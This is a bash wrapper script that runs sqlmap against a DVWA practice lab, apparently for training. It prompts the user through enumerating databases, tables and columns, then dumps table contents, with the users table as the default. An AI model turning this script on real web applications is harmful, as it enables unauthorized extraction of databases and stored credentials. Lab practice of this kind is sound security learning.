#!/bin/bash

IP_ADDR="http://192.168.0.111/DVWA/vulnerabilities/sqli/?id=&Submit=Submit#"
COOKIE="PHPSESSID=dne6505lcdsp69oct255ek5im7; security=low"
SELECT_DATABASE="dvwa"
SELECT_TABLE="users"

function execute_sqlmap()
{
    note=$1
    cmd=${@:2}

    read -p "    $note? Y/n " judge
    if [ -z $judge ] || [ $judge == 'y' ] || [ $judge == 'Y' ]; then
        set -x
        python sqlmap.py -u "$IP_ADDR" --cookie="$COOKIE" $cmd
        set +x
    fi
}

# 1.get all database name
execute_sqlmap "1.get all database name" "-dbs"

# 2.get all database name
read -p "    which database name do you want to get? default [$SELECT_DATABASE]: " database
if [ ! -z $database ]; then
    SELECT_DATABASE=$database
fi
execute_sqlmap "2.get all tables of database [$SELECT_DATABASE]" "-D $SELECT_DATABASE --tables"

# 3.get all columns type
read -p "    which table name do you want to get? default [$SELECT_TABLE]: " table
if [ ! -z $table ]; then
    SELECT_TABLE=$table
fi
execute_sqlmap "3.get all columns type of select table [$SELECT_TABLE]" "-D $SELECT_DATABASE -T $SELECT_TABLE --columns"

# 4.get all data in select table
execute_sqlmap "4.get all data of select table [$SELECT_TABLE]" "-D $SELECT_DATABASE -T $SELECT_TABLE --dump"

